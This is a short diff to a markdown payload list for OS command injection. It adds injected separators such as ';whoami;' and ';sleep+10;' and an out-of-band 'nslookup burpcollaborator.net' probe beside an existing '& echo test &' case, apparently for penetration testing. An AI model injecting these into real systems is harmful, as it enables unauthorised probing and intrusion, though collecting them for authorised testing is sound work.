@@ -1,5 +1,11 @@
 # OS Command Injection Payloads
 ___
+## Wordlist
+```sh
+;whoami;
+;sleep+10;
+nslookup burpcollaborator.net
+```
 ## Simple Case
 ```sh
 & echo test &
